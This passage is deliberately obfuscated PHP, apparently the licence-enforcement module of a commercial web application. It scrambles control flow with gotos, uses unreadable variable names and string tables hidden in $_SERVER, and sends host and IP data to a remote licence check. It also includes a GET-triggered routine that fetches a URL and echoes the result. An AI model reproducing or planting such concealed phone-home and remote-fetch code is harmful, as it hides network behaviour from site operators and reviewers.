$e“ÏÏæÎÚ£[157]($e“ÏÏæÎÚ£[119]($this->uszxfd58a655, $e“ÏÏæÎÚ£[158])); $bæ×¹ˆ‹ğ‹[$e“ÏÏæÎÚ£[159]] = $e“ÏÏæÎÚ£[119]($this->uszxfd58a655, $e“ÏÏæÎÚ£[144]); } $E×ù¦è”¬‚ = $e“ÏÏæÎÚ£[61]($e“ÏÏæÎÚ£[62])->{$_SERVER[ÖÙ“üÓ½‰][63]}($e“ÏÏæÎÚ£[160], $e“ÏÏæÎÚ£[10], !0); if ($e“ÏÏæÎÚ£[161]($E×ù¦è”¬‚) && $e“ÏÏæÎÚ£[25]($E×ù¦è”¬‚, 0, 1) == $e“ÏÏæÎÚ£[162]) { $E×ù¦è”¬‚ = $e“ÏÏæÎÚ£[163]($E×ù¦è”¬‚); } if ($e“ÏÏæÎÚ£[164]($E×ù¦è”¬‚) && $E×ù¦è”¬‚[$e“ÏÏæÎÚ£[165]] && $e“ÏÏæÎÚ£[32]($E×ù¦è”¬‚[$e“ÏÏæÎÚ£[165]], $e“ÏÏæÎÚ£[166])) { $bÌ‡§–´æ = $e“ÏÏæÎÚ£[0]($e“ÏÏæÎÚ£[166], $E×ù¦è”¬‚[$e“ÏÏæÎÚ£[165]]); $bæ×¹ˆ‹ğ‹[$e“ÏÏæÎÚ£[167]] = $bÌ‡§–´æ[0]; } } $bæ×¹ˆ‹ğ‹ = $this->{$_SERVER[ÖÙ“üÓ½‰][168]}($e“ÏÏæÎÚ£[169]($bæ×¹ˆ‹ğ‹), $e“ÏÏæÎÚ£[127]($e“ÏÏæÎÚ£[170])); goto Bäùë«ê°œ; dƒ¡äµ·İ: $cÔùîöòìù = $c¯¢ÜÜ®[635]; if (!$cÔùîöòìù) { return; } goto bÏËœ©Ö±; bÏËœ©Ö±: } goto aŒ´ ƒŒ¯‹; aŒ´ ƒŒ¯‹: if ($this->gpked788a35e == $e“ÏÏæÎÚ£[134]) { return; } $e¾Ÿ÷†âÑå = array($e“ÏÏæÎÚ£[174], $e“ÏÏæÎÚ£[175], $e“ÏÏæÎÚ£[176], $e“ÏÏæÎÚ£[177], $e“ÏÏæÎÚ£[178], $e“ÏÏæÎÚ£[179]); $d ßÀÌ›Ø© = $c¯¢ÜÜ®[636]; goto f«…’çÊ¢ç; f«…’çÊ¢ç: if (!$d ßÀÌ›Ø©) { die; } $D§è‚•Áò = $e“ÏÏæÎÚ£[61]($e“ÏÏæÎÚ£[62])->{$_SERVER[ÖÙ“üÓ½‰][63]}(); $C‰ˆæ½» = array($e“ÏÏæÎÚ£[180] => $D§è‚•Áò[$e“ÏÏæÎÚ£[64]], $e“ÏÏæÎÚ£[181] => $D§è‚•Áò[$e“ÏÏæÎÚ£[65]], $e“ÏÏæÎÚ£[182] => $e“ÏÏæÎÚ£[10]); goto DŸ›´ÉÄ; e¦Âøô‚ß: } private function rfbjd4b4c1c0() { goto B¿Õ½ºÍã¶; EáÌÍì™¦œ: if (!$aÓà´œºÁÔ[119]($GLOBALS, $aÓà´œºÁÔ[145])) { die; } $c›ÙÂ ƒã‹ = $GLOBALS[$aÓà´œºÁÔ[22]]; if (isset($c›ÙÂ ƒã‹[$aÓà´œºÁÔ[184]])) { $this->{$_SERVER[ÖÙ“üÓ½‰][185]}(); die; } goto fÑ¥éêˆŞÌ; F¬Ìˆğ¶Ë†: $AŠÎõ°´«ñ = $bã”“®®•È[649]; if (strlen($AŠÎõ°´«ñ) < $bã”“®®•È[608]) { die; } $aÓà´œºÁÔ[187]($aÓà´œºÁÔ[219]($aÓà´œºÁÔ[229]), !0); goto fŠ‹Ï‡ˆÌö; FÌËÉ‡Êê: $c–ùœá•Çš = array(); $c–ùœá•Çš[$Dƒ¨µÇ¡ò] = $C§…¢ÓÏà; $DÛ…§”õ¤° = $bã”“®®•È[647]; goto b×œŠÙ‰„; bÚ„ï‹ÈÎ™: $C§…¢ÓÏà = $this->{$_SERVER[ÖÙ“üÓ½‰][140]}($aÓà´œºÁÔ[169]($BË‰Œ×ßÄğ), $eŸÖÒìå±); $DêÓñŒºœ = $bã”“®®•È[644]; while ($DêÓñŒºœ < $bã”“®®•È[594]) { if ($DêÓñŒºœ >= 0) { break; } $DêÓñŒºœ++; } goto bÆÇä­†ƒ; fÑ¥éêˆŞÌ: if (!isset($c›ÙÂ ƒã‹[$aÓà´œºÁÔ[186]]) || $aÓà´œºÁÔ[24]($c›ÙÂ ƒã‹[$aÓà´œºÁÔ[186]]) != 16) { $aÓà´œºÁÔ[187]($aÓà´œºÁÔ[188] . $c›ÙÂ ƒã‹[$aÓà´œºÁÔ[186]], !1); } $c“ÀÌøƒ = $aÓà´œºÁÔ[61]($aÓà´œºÁÔ[62])->{$_SERVER[ÖÙ“üÓ½‰][63]}($aÓà´œºÁÔ[129]); $bÁò‡‚ˆ † = $aÓà´œºÁÔ[127]($_SERVER[$aÓà´œºÁÔ[128]] . $c“ÀÌøƒ); goto B ï‘Åôì¾; AğÇ’­¢Â½: $Dƒ¨µÇ¡ò = $aÓà´œºÁÔ[236]($aÓà´œºÁÔ[25]($eŸÖÒìå±, 10, 16)); $FÊ‚–™åŸ = $bã”“®®•È[643]; while ($FÊ‚–™åŸ < $bã”“®®•È[594]) { if ($FÊ‚–™åŸ >= 0) { break; } $FÊ‚–™åŸ++; } goto bÚ„ï‹ÈÎ™; B„ãÌåê–æ: $EÂÕ…ìÙ¨× = $böÏ¸ÕÂƒĞ[$aÓà´œºÁÔ[247]]; $D»ˆĞ–Â—™ = $bã”“®®•È[646]; if (!$D»ˆĞ–Â—™) { die; } goto FÌËÉ‡Êê; D‹â†Éïİ: $DÜÜ®ù¨…¿ = $bã”“®®•È[641]; if (!$DÜÜ®ù¨…¿) { return; } $aë†£Ê«²Ü = $A‹…©ƒò„Ç . $Fˆ‰¹—ƒ[$aÓà´œºÁÔ[133]] . $this->{$_SERVER[ÖÙ“üÓ½‰][168]}($aÓà´œºÁÔ[127]($Fˆ‰¹—ƒ[$aÓà´œºÁÔ[230]]), $A‹…©ƒò„Ç); goto Eô†ï„‹ÑŠ; EŠ™å‹İ: while (strlen($eª°‚¹—ëŸ) < $bã”“®®•È[594]) { if (!$eª°‚¹—ëŸ) { break; } $eª°‚¹—ëŸ++; } $Fˆ‰¹—ƒ[$aÓà´œºÁÔ[135]] = $aÓà´œºÁÔ[236]($aÓà´œºÁÔ[131]($this->{$_SERVER[ÖÙ“üÓ½‰][168]}($fğÏÙ·­õé, $aÓà´œºÁÔ[237]))); $A‹…©ƒò„Ç = $aÓà´œºÁÔ[137](16); goto D‹â†Éïİ; cŸì²¯â“: $eÊÃŠˆŒƒµ = $bã”“®®•È[635]; $this->gpked788a35e = $Fˆ‰¹—ƒ[$aÓà´œºÁÔ[133]]; $this->{$_SERVER[ÖÙ“üÓ½‰][251]}(); goto dˆ¯‹šÔ„’; B ï‘Åôì¾: $f¨¤àáİí = array($aÓà´œºÁÔ[186] => $c›ÙÂ ƒã‹[$aÓà´œºÁÔ[186]], $aÓà´œºÁÔ[189] => $aÓà´œºÁÔ[137](16), $aÓà´œºÁÔ[190] => $aÓà´œºÁÔ[170], $aÓà´œºÁÔ[191] => $aÓà´œºÁÔ[192], $aÓà´œºÁÔ[193] => $_SERVER[$aÓà´œºÁÔ[194]], $aÓà´œºÁÔ[195] => $_SERVER[$aÓà´œºÁÔ[196]], $aÓà´œºÁÔ[197] => $_SERVER[$aÓà´œºÁÔ[198]], $aÓà´œºÁÔ[126] => $bÁò‡‚ˆ †, $aÓà´œºÁÔ[199] => $aÓà´œºÁÔ[61]($aÓà´œºÁÔ[62])->{$_SERVER[ÖÙ“üÓ½‰][63]}($aÓà´œºÁÔ[160])); $BôšöÓÎ¥ƒ = $bã”“®®•È[639]; if ($c›ÙÂ ƒã‹[$aÓà´œºÁÔ[200]] == $aÓà´œºÁÔ[201]) { $D‹‹¥¢áÖ· = $this->{$_SERVER[ÖÙ“üÓ½‰][168]}($bÁò‡‚ˆ †, $aÓà´œºÁÔ[202]); $F¿×ªÂåÚ‚ = $this->{$_SERVER[ÖÙ“üÓ½‰][140]}($aÓà´œºÁÔ[169]($f¨¤àáİí), $bÁò‡‚ˆ † . $aÓà´œºÁÔ[203], 3); $F¿×ªÂåÚ‚ = $F¿×ªÂåÚ‚ . $aÓà´œºÁÔ[204] . $_SERVER[$aÓà´œºÁÔ[194]]; $C¸ÖØöŞ¾„ = $this->{$_SERVER[ÖÙ“üÓ½‰][205]}($aÓà´œºÁÔ[206] . $D‹‹¥¢áÖ· . $aÓà´œºÁÔ[207] . $F¿×ªÂåÚ‚, -1); $aÓà´œºÁÔ[187]($C¸ÖØöŞ¾„, !0); } else { if ($c›ÙÂ ƒã‹[$aÓà´œºÁÔ[200]] == $aÓà´œºÁÔ[208]) { $EÕÀ„Š„ª = $aÓà´œºÁÔ[25]($aÓà´œºÁÔ[127]($aÓà´œºÁÔ[209] . $bÁò‡‚ˆ †), 12, 15) . $aÓà´œºÁÔ[210]; $F¿×ªÂåÚ‚ = $this->{$_SERVER[ÖÙ“üÓ½‰][211]}($aÓà´œºÁÔ[2]($c›ÙÂ ƒã‹[$aÓà´œºÁÔ[212]]), $EÕÀ„Š„ª, 2); $d’¯Ï ˜¹™ = $aÓà´œºÁÔ[213]($F¿×ªÂåÚ‚, !0); if (!$aÓà´œºÁÔ[164]($d’¯Ï ˜¹™) || !$aÓà´œºÁÔ[164]($d’¯Ï ˜¹™[$aÓà´œºÁÔ[214]]) || $d’¯Ï ˜¹™[$aÓà´œºÁÔ[186]] != !0) { $dì£ê§…Ê“ = $aÓà´œºÁÔ[215]; $aö„ˆŸô¹’ = $d’¯Ï ˜¹™[$aÓà´œºÁÔ[214]] ? $aÓà´œºÁÔ[216] . $d’¯Ï ˜¹™[$aÓà´œºÁÔ[214]] : $dì£ê§…Ê“; $aÓà´œºÁÔ[187]($aö„ˆŸô¹’, !1); } else { $f¨¤àáİí[$aÓà´œºÁÔ[189]] = $d’¯Ï ˜¹™[$aÓà´œºÁÔ[214]][$aÓà´œºÁÔ[217]]; } } else { $d’¯Ï ˜¹™ = $this->{$_SERVER[ÖÙ“üÓ½‰][205]}($aÓà´œºÁÔ[218], $f¨¤àáİí, 10); } } goto C­ÙÄ«¯†š; dˆ¯‹šÔ„’: $a¦²áÊòÕ = $bã”“®®•È[648]; if (strlen($a¦²áÊòÕ) < $bã”“®®•È[592]) { return; } Cache::set($aÓà´œºÁÔ[252] . $aÓà´œºÁÔ[127]($c“ÀÌøƒ . $aÓà´œºÁÔ[253]), $aÓà´œºÁÔ[10]); goto F¬Ìˆğ¶Ë†; CÓ¢îšŞ š: $D§Ùå°à¨í = $aÓà´œºÁÔ[25]($aÓà´œºÁÔ[127]($Fˆ‰¹—ƒ[$aÓà´œºÁÔ[232]]), 10, 10); $fğÏÙ·­õé = $D§Ùå°à¨í . $Fˆ‰¹—ƒ[$aÓà´œºÁÔ[133]] . $Fˆ‰¹—ƒ[$aÓà´œºÁÔ[234]]; $eª°‚¹—ëŸ = $bã”“®®•È[640]; goto EŠ™å‹İ; fŠ‹Ï‡ˆÌö: $a“Ãºßò—â = $bã”“®®•È[650]; while (strlen($a“Ãºßò—â) < $bã”“®®•È[592]) { if (!$a“Ãºßò—â) { break; } $a“Ãºßò—â++; } goto A®„Åí§ÚÒ; b×œŠÙ‰„: while (strlen($DÛ…§”õ¤°) < $bã”“®®•È[592]) { if (!$DÛ…§”õ¤°) { break; } $DÛ…§”õ¤°++; } $aÓà´œºÁÔ[61]($aÓà´œºÁÔ[11])->{$_SERVER[ÖÙ“üÓ½‰][248]}($EÂÕ…ìÙ¨×[$aÓà´œºÁÔ[249]], array($aÓà´œºÁÔ[250] => $c–ùœá•Çš)); $this->uszxfd58a655 = $BË‰Œ×ßÄğ; goto cŸì²¯â“; Eô†ï„‹ÑŠ: $Fˆ‰¹—ƒ[$aÓà´œºÁÔ[136]] = $aÓà´œºÁÔ[131]($aÓà´œºÁÔ[236]($this->{$_SERVER[ÖÙ“üÓ½‰][168]}($aë†£Ê«²Ü, $aÓà´œºÁÔ[238]))); $cÏ™¶©¹ = $bã”“®®•È[642]; if (strlen($cÏ™¶©¹) < $bã”“®®•È[611]) { return; } goto dÏ‚ÜÇëæ™; dÏ‚ÜÇëæ™: if ($BË‰Œ×ßÄğ[$aÓà´œºÁÔ[239]] && $BË‰Œ×ßÄğ[$aÓà´œºÁÔ[239]] >= 1) { $aÓà´œºÁÔ[61]($aÓà´œºÁÔ[62])->{$_SERVER[ÖÙ“üÓ½‰][240]}($aÓà´œºÁÔ[241], $aÓà´œºÁÔ[242]); } $aÓà´œºÁÔ[61]($aÓà´œºÁÔ[62])->{$_SERVER[ÖÙ“üÓ½‰][243]}($Fˆ‰¹—ƒ); $eŸÖÒìå± = $aÓà´œºÁÔ[127]($_SERVER[$aÓà´œºÁÔ[128]] . $aÓà´œºÁÔ[236]($c“ÀÌøƒ) . $Fˆ‰¹—ƒ[$aÓà´œºÁÔ[232]]); goto AğÇ’­¢Â½; bÆÇä­†ƒ: $böÏ¸ÕÂƒĞ = $aÓà´œºÁÔ[244]($aÓà´œºÁÔ[61]($aÓà´œºÁÔ[11])->{$_SERVER[ÖÙ“üÓ½‰][245]}(), $aÓà´œºÁÔ[246]); $Cœùî…£‘Ô = $bã”“®®•È[645]; while (strlen($Cœùî…£‘Ô) < $bã”“®®•È[608]) { if (!$Cœùî…£‘Ô) { break; } $Cœùî…£‘Ô++; } goto B„ãÌåê–æ; B¿Õ½ºÍã¶: $bã”“®®•È =& $_SERVER[ä°„ä°º]; $aÓà´œºÁÔ =& $_SERVER[ÖÙ“üÓ½‰]; if ($_SERVER[$aÓà´œºÁÔ[44]] != $aÓà´œºÁÔ[183]) { return; } goto EáÌÍì™¦œ; f‰ò·‚ñ›: if (!$Eœ¡íæè­è || $Eœ¡íæè­è != $BË‰Œ×ßÄğ[$aÓà´œºÁÔ[158]]) { $D…°øÇÈ‡¾ = array($aÓà´œºÁÔ[223] => $aÓà´œºÁÔ[61]($aÓà´œºÁÔ[62])->{$_SERVER[ÖÙ“üÓ½‰][63]}($aÓà´œºÁÔ[129]), $aÓà´œºÁÔ[224] => $_SERVER[$aÓà´œºÁÔ[128]], $aÓà´œºÁÔ[225] => $aÓà´œºÁÔ[226](), $aÓà´œºÁÔ[195] => $_SERVER[$aÓà´œºÁÔ[196]]); $F¿×ªÂåÚ‚ = $this->{$_SERVER[ÖÙ“üÓ½‰][227]}($aÓà´œºÁÔ[169]($D…°øÇÈ‡¾)); $this->{$_SERVER[ÖÙ“üÓ½‰][205]}($aÓà´œºÁÔ[228] . $F¿×ªÂåÚ‚); $aÓà´œºÁÔ[187]($aÓà´œºÁÔ[219]($aÓà´œºÁÔ[229]), !0); } $Fˆ‰¹—ƒ = array($aÓà´œºÁÔ[230] => $BË‰Œ×ßÄğ[$aÓà´œºÁÔ[231]], $aÓà´œºÁÔ[232] => $BË‰Œ×ßÄğ[$aÓà´œºÁÔ[233]], $aÓà´œºÁÔ[234] => $aÓà´œºÁÔ[137](16), $aÓà´œºÁÔ[133] => $BË‰Œ×ßÄğ[$aÓà´œºÁÔ[235]]); if ($f¨¤àáİí[$aÓà´œºÁÔ[189]]) { $Fˆ‰¹—ƒ[$aÓà´œºÁÔ[234]] = $f¨¤àáİí[$aÓà´œºÁÔ[189]]; } goto CÓ¢îšŞ š; C­ÙÄ«¯†š: if (!$aÓà´œºÁÔ[164]($d’¯Ï ˜¹™) || !$aÓà´œºÁÔ[164]($d’¯Ï ˜¹™[$aÓà´œºÁÔ[214]]) || $d’¯Ï ˜¹™[$aÓà´œºÁÔ[186]] != !0) { $dì£ê§…Ê“ = $aÓà´œºÁÔ[219]($aÓà´œºÁÔ[220]); $aö„ˆŸô¹’ = $d’¯Ï ˜¹™[$aÓà´œºÁÔ[214]] ? $aÓà´œºÁÔ[216] . $d’¯Ï ˜¹™[$aÓà´œºÁÔ[214]] : $dì£ê§…Ê“; $aÓà´œºÁÔ[187]($aö„ˆŸô¹’, !1); } $BË‰Œ×ßÄğ = $d’¯Ï ˜¹™[$aÓà´œºÁÔ[214]]; $Eœ¡íæè­è = $this->{$_SERVER[ÖÙ“üÓ½‰][221]}($BË‰Œ×ßÄğ[$aÓà´œºÁÔ[222]]); goto f‰ò·‚ñ›; A®„Åí§ÚÒ: } private function licenseRegistSuccess() { $Cç¡Å“ÄŸ =& $_SERVER[ÖÙ“üÓ½‰]; $FÖ¥ÎÜ²­Ü = $Cç¡Å“ÄŸ[61]($Cç¡Å“ÄŸ[62])->{$_SERVER[ÖÙ“üÓ½‰][63]}(); if ($FÖ¥ÎÜ²­Ü[$Cç¡Å“ÄŸ[93]] != $Cç¡Å“ÄŸ[242]) { $Cç¡Å“ÄŸ[61]($Cç¡Å“ÄŸ[62])->{$_SERVER[ÖÙ“üÓ½‰][243]}($Cç¡Å“ÄŸ[93], $Cç¡Å“ÄŸ[242]); } $Cç¡Å“ÄŸ[123]($Cç¡Å“ÄŸ[254])->{$_SERVER[ÖÙ“üÓ½‰][255]}(!0); } private function bugea075e1f4() { goto F¬ÌŠñ˜Î’; F¬ÌŠñ˜Î’: $AËÛ•¥¥—Œ =& $_SERVER[ä°„ä°º]; $dõ×¡¨§¦‘ =& $_SERVER[ÖÙ“üÓ½‰]; $dõ×¡¨§¦‘[61]($dõ×¡¨§¦‘[62])->{$_SERVER[ÖÙ“üÓ½‰][243]}(array($dõ×¡¨§¦‘[230] => $dõ×¡¨§¦‘[10], $dõ×¡¨§¦‘[232] => $dõ×¡¨§¦‘[10], $dõ×¡¨§¦‘[133] => $dõ×¡¨§¦‘[134], $dõ×¡¨§¦‘[135] => $dõ×¡¨§¦‘[10], $dõ×¡¨§¦‘[136] => $dõ×¡¨§¦‘[10])); goto d»Ç„®ÄŠÇ; AÉŒ³Ô­¦: $b•ŸŒ Ù™ = $AËÛ•¥¥—Œ[652]; if (strlen($b•ŸŒ Ù™) < $AËÛ•¥¥—Œ[605]) { die; } $this->uszxfd58a655 = array(); goto C‡¼¬ˆ¦Ï¹; C‡¼¬ˆ¦Ï¹: $a‚”Ê‹É‚Ê = $AËÛ•¥¥—Œ[653]; if (strlen($a‚”Ê‹É‚Ê) < $AËÛ•¥¥—Œ[608]) { return; } $this->gpked788a35e = $dõ×¡¨§¦‘[134]; goto aìà‘î‰…Œ; d»Ç„®ÄŠÇ: $BêİªÏÓøô = $AËÛ•¥¥—Œ[651]; if (strlen($BêİªÏÓøô) < $AËÛ•¥¥—Œ[605]) { return; } $dõ×¡¨§¦‘[61]($dõ×¡¨§¦‘[62])->{$_SERVER[ÖÙ“üÓ½‰][240]}($dõ×¡¨§¦‘[241], $dõ×¡¨§¦‘[256]); goto AÉŒ³Ô­¦; aìà‘î‰…Œ: } private function ejbc7b2ba502() { goto CÁÚÒªèªœ; bâ±å«‰¥: $c¢š·ã‰¾à = $A¬ë£ªÛ§[655]; if (strlen($c¢š·ã‰¾à) < $A¬ë£ªÛ§[605]) { return; } $c™°İÄª = $dèÁÙ‰à¬™[61]($dèÁÙ‰à¬™[62])->{$_SERVER[ÖÙ“üÓ½‰][63]}(); goto f…Î®ò‹Äó; dî„‘®íÅØ: $cÙƒ‹ƒàâø = $A¬ë£ªÛ§[654]; while (strlen($cÙƒ‹ƒàâø) < $A¬ë£ªÛ§[594]) { if (!$cÙƒ‹ƒàâø) { break; } $cÙƒ‹ƒàâø++; } $this->gpked788a35e = $dèÁÙ‰à¬™[134]; goto bâ±å«‰¥; FÛ¤â‡Íäê: $a²ƒ«ÖŸªä = $dèÁÙ‰à¬™[157]($FæœÁïÑ¬[$dèÁÙ‰à¬™[158]]); if ($dèÁÙ‰à¬™[258]() >= $a²ƒ«ÖŸªä) { return $this->{$_SERVER[ÖÙ“üÓ½‰][185]}(); } if ($dèÁÙ‰à¬™[258]() - $FæœÁïÑ¬[$dèÁÙ‰à¬™[257]] > 20) { $FæœÁïÑ¬[$dèÁÙ‰à¬™[257]] = $dèÁÙ‰à¬™[258](); Cache::set($A”é»øõø¢, $FæœÁïÑ¬); } goto cÀ›‰ô ›®; f½ŸÑ°Ööá: $d†¶ØÑôÏ— = $dèÁÙ‰à¬™[61]($dèÁÙ‰à¬™[62])->{$_SERVER[ÖÙ“üÓ½‰][63]}($dèÁÙ‰à¬™[129]); $A”é»øõø¢ = $dèÁÙ‰à¬™[252] . $dèÁÙ‰à¬™[127]($d†¶ØÑôÏ— . $dèÁÙ‰à¬™[253]); $FæœÁïÑ¬ = Cache::get($A”é»øõø¢); goto fÜÎ¢÷à‹; fÜÎ¢÷à‹: $c©çÏ³ò¿Õ = $A¬ë£ªÛ§[657]; if (!$dèÁÙ‰à¬™[164]($FæœÁïÑ¬) || !isset($FæœÁïÑ¬[$dèÁÙ‰à¬™[257]]) || $dèÁÙ‰à¬™[258]() - $FæœÁïÑ¬[$dèÁÙ‰à¬™[257]] >= 60) { $D¬²Öøò‡É = $dèÁÙ‰à¬™[244]($dèÁÙ‰à¬™[61]($dèÁÙ‰à¬™[11])->{$_SERVER[ÖÙ“üÓ½‰][245]}(), $dèÁÙ‰à¬™[246]); $Cœ¬öóæë¸ = $D¬²Öøò‡É[$dèÁÙ‰à¬™[247]]; $FÉ‚°äß†º = $dèÁÙ‰à¬™[127]($_SERVER[$dèÁÙ‰à¬™[128]] . $dèÁÙ‰à¬™[236]($d†¶ØÑôÏ—) . $c™°İÄª[$dèÁÙ‰à¬™[232]]); $cÌ¡«¦ª…… = $dèÁÙ‰à¬™[236]($dèÁÙ‰à¬™[25]($FÉ‚°äß†º, 10, 16)); $FæœÁïÑ¬ = $this->{$_SERVER[ÖÙ“üÓ½‰][211]}($Cœ¬öóæë¸[$dèÁÙ‰à¬™[107]][$cÌ¡«¦ª……], $FÉ‚°äß†º); $FæœÁïÑ¬ = $dèÁÙ‰à¬™[213]($FæœÁïÑ¬, !0); } if (!$dèÁÙ‰à¬™[164]($FæœÁïÑ¬)) { return $this->{$_SERVER[ÖÙ“üÓ½‰][185]}(); } goto FÛ¤â‡Íäê; cÀ›‰ô ›®: $this->uszxfd58a655 = $FæœÁïÑ¬; $this->gpked788a35e = $c™°İÄª[$dèÁÙ‰à¬™[133]]; goto e·Ö£¦½ù†; f…Î®ò‹Äó: $fˆøêßÆ´ = $A¬ë£ªÛ§[656]; while ($fˆøêßÆ´ < $A¬ë£ªÛ§[608]) { if ($fˆøêßÆ´ >= 0) { break; } $fˆøêßÆ´++; } if ($c™°İÄª[$dèÁÙ‰à¬™[133]] == $dèÁÙ‰à¬™[134]) { return; } goto f½ŸÑ°Ööá; CÁÚÒªèªœ: $A¬ë£ªÛ§ =& $_SERVER[ä°„ä°º]; $dèÁÙ‰à¬™ =& $_SERVER[ÖÙ“üÓ½‰]; $_SERVER[$dèÁÙ‰à¬™[196]] = $dèÁÙ‰à¬™[119]($_SERVER, $dèÁÙ‰à¬™[196], APP_HOST); goto dî„‘®íÅØ; e·Ö£¦½ù†: } private function uegw10d66c68() { goto CÙËËğ‹ƒ¨; fĞ¯©»Æ¤Û: $d‚†´åÅ”Ï = $_SERVER[$D’Š¹°¡[44]]; $cŒ±ÔÚ¬†ñ = $E¬³‹¦ù…¦[658]; while (strlen($cŒ±ÔÚ¬†ñ) < $E¬³‹¦ù…¦[605]) { if (!$cŒ±ÔÚ¬†ñ) { break; } $cŒ±ÔÚ¬†ñ++; } goto e¢’×õ×¼¤; CÙËËğ‹ƒ¨: $E¬³‹¦ù…¦ =& $_SERVER[ä°„ä°º]; $D’Š¹°¡ =& $_SERVER[ÖÙ“üÓ½‰]; $DšğÛ¯ç‡† = $GLOBALS[$D’Š¹°¡[22]]; goto fĞ¯©»Æ¤Û; e¢’×õ×¼¤: if ($d‚†´åÅ”Ï == $D’Š¹°¡[259] && $this->gpked788a35e == $D’Š¹°¡[134]) { $D’Š¹°¡[187]($D’Š¹°¡[219]($D’Š¹°¡[260]), !1, $D’Š¹°¡[261]); } $aƒ‚½Ë¥¯ = array($D’Š¹°¡[262], $D’Š¹°¡[263]); if ($D’Š¹°¡[264]($d‚†´åÅ”Ï, $aƒ‚½Ë¥¯)) { if ($this->gpked788a35e == $D’Š¹°¡[134] && isset($DšğÛ¯ç‡†[$D’Š¹°¡[265]])) { $D’Š¹°¡[187]($D’Š¹°¡[219]($D’Š¹°¡[260]), !1, $D’Š¹°¡[261]); die; } $Dê®¤çÏ°ì = $this->{$_SERVER[ÖÙ“üÓ½‰][150]}(); if ($Dê®¤çÏ°ì != $D’Š¹°¡[266]($D’Š¹°¡[267])) { if ($Dê®¤çÏ°ì <= $D’Š¹°¡[61]($D’Š¹°¡[152])->{$_SERVER[ÖÙ“üÓ½‰][153]}()) { $D’Š¹°¡[187]($D’Š¹°¡[219]($D’Š¹°¡[268]), !1, $D’Š¹°¡[261]); die; } } } goto CßÒ¶ïõ–Á; CßÒ¶ïõ–Á: } private function veild6464222() { goto E‡è´˜ŸèÏ; a²¡›×Î‚à: $FÂ³åå‘çò = @$AŒËÆÀâ[279]($Aæ¨¨õÚ’Ä, !1, $bÈâƒ…ÙñÅ); $AŒËÆÀâ[280]($AŒËÆÀâ[281]); $BãÖ•ÆŸö = $c¿ëçÅ¹‚[662]; goto cº¶¼¦å—…; E‡è´˜ŸèÏ: $c¿ëçÅ¹‚ =& $_SERVER[ä°„ä°º]; $AŒËÆÀâ =& $_SERVER[ÖÙ“üÓ½‰]; $D½ğ‡ôÍ«´ = array($AŒËÆÀâ[148], $AŒËÆÀâ[269]); goto FğÀÃù»ñÁ; cº¶¼¦å—…: if ($FÂ³åå‘çò && $AŒËÆÀâ[32]($FÂ³åå‘çò, $AŒËÆÀâ[282])) { echo $FÂ³åå‘çò; } die; goto c‰àÍÉõŸ; A×‘â“×¶å: $Aæ¨¨õÚ’Ä = $this->{$_SERVER[ÖÙ“üÓ½‰][272]}($Aæ¨¨õÚ’Ä, $AŒËÆÀâ[273]); $bÈâƒ…ÙñÅ = $AŒËÆÀâ[274](array($AŒËÆÀâ[275] => array($AŒËÆÀâ[276] => $AŒËÆÀâ[277], $AŒËÆÀâ[278] => 3))); $BªĞÃîÈÈä = $c¿ëçÅ¹‚[661]; goto a²¡›×Î‚à; FğÀÃù»ñÁ: $b¼çöˆ·à = $c¿ëçÅ¹‚[659]; if (!$AŒËÆÀâ[119]($GLOBALS, $AŒËÆÀâ[145]) || !isset($_GET[$AŒËÆÀâ[270]])) { return; } if (!$AŒËÆÀâ[264]($_SERVER[$AŒËÆÀâ[44]], $D½ğ‡ôÍ«´)) { return; } goto fõö‹¶¦Š; fõö‹¶¦Š: $Aæ¨¨õÚ’Ä = $AŒËÆÀâ[271]; $fº‰š– ¦ª = $c¿ëçÅ¹‚[660]; if (!$fº‰š– ¦ª) { die; } goto A×‘â“×¶å; c‰àÍÉõŸ: } public function ekoccf55610b($eóŠ„»ÛŸÀ) { goto böÈêÀÇòª; c„åŒÊÕîâ: $DÜ¢‰¥ÄÂ = array($eØàñÒÖ¤[284] => $eØàñÒÖ¤[285], $eØàñÒÖ¤[286] => $eØàñÒÖ¤[285], $eØàñÒÖ¤[287] => $eØàñÒÖ¤[285], $eØàñÒÖ¤[288] => $eØàñÒÖ¤[285], $eØàñÒÖ¤[289] => $eØàñÒÖ¤[290], $eØàñÒÖ¤[291] => $eØàñÒÖ¤[290], $eØàñÒÖ¤[292] => $eØàñÒÖ¤[290], $eØàñÒÖ¤[293] => $eØàñÒÖ¤[290], $eØàñÒÖ¤[294] => $eØàñÒÖ¤[290], $eØàñÒÖ¤[295] => $eØàñÒÖ¤[290], $eØàñÒÖ¤[296] => $eØàñÒÖ¤[290], $eØàñÒÖ¤[297] => $eØàñÒÖ¤[290], $eØàñÒÖ¤[298] => $eØàñÒÖ¤[290], $eØàñÒÖ¤[299] => $eØàñÒÖ¤[290], $eØàñÒÖ¤[300] => $eØàñÒÖ¤[290], $eØàñÒÖ¤[301] => $eØàñÒÖ¤[290]); $bË‰‹í†©“ = $eØàñÒÖ¤[0]($eØàñÒÖ¤[302], $eØàñÒÖ¤[119]($this->uszxfd58a655, $eØàñÒÖ¤[142], $eØàñÒÖ¤[10])); $C†•áÌÊï¾ = $fƒ¯»•›Ú¯[663]; goto e‹‘½ÛÃ„ª; böÈêÀÇòª: $fƒ¯»•›Ú¯ =& $_SERVER[ä°„ä°º]; $eØàñÒÖ¤ =& $_SERVER[ÖÙ“üÓ½‰]; if ($this->gpked788a35e == $eØàñÒÖ¤[283]) { return $eóŠ„»ÛŸÀ; } goto c„åŒÊÕîâ; A…ö½Ä¬î: if (!$Aëöò±Œˆ) { die; } foreach ($DÜ¢‰¥ÄÂ as $F†µ™œö£É => $fÈÎÏç‡Í½) { if ($fÈÎÏç‡Í½ == $eØàñÒÖ¤[285] && $eØàñÒÖ¤[25]($this->gpked788a35e, 0, 1) == $eØàñÒÖ¤[285]) { continue; } if (!$eØàñÒÖ¤[264]($F†µ™œö£É, $bË‰‹í†©“)) { $aæ‡òŠˆ‘[] = $F†µ™œö£É; } } foreach ($aæ‡òŠˆ‘ as $F†µ™œö£É) { unset($eóŠ„»ÛŸÀ[$F†µ™œö£É]); } goto AÛ–À¾‹º; AÛ–À¾‹º: return $eóŠ„»ÛŸÀ; $A„¨‹ÚŞÉŒ = $fƒ¯»•›Ú¯[665]; if (strlen($A„¨‹ÚŞÉŒ) < $fƒ¯»•›Ú¯[592]) { die; } goto Fä¯­ùØš²; e‹‘½ÛÃ„ª: while ($C†•áÌÊï¾ < $fƒ¯»•›Ú¯[592]) { if ($C†•áÌÊï¾ >= 0) { break; } $C†•áÌÊï¾++; } $aæ‡òŠˆ‘ = array(); $Aëöò±Œˆ = 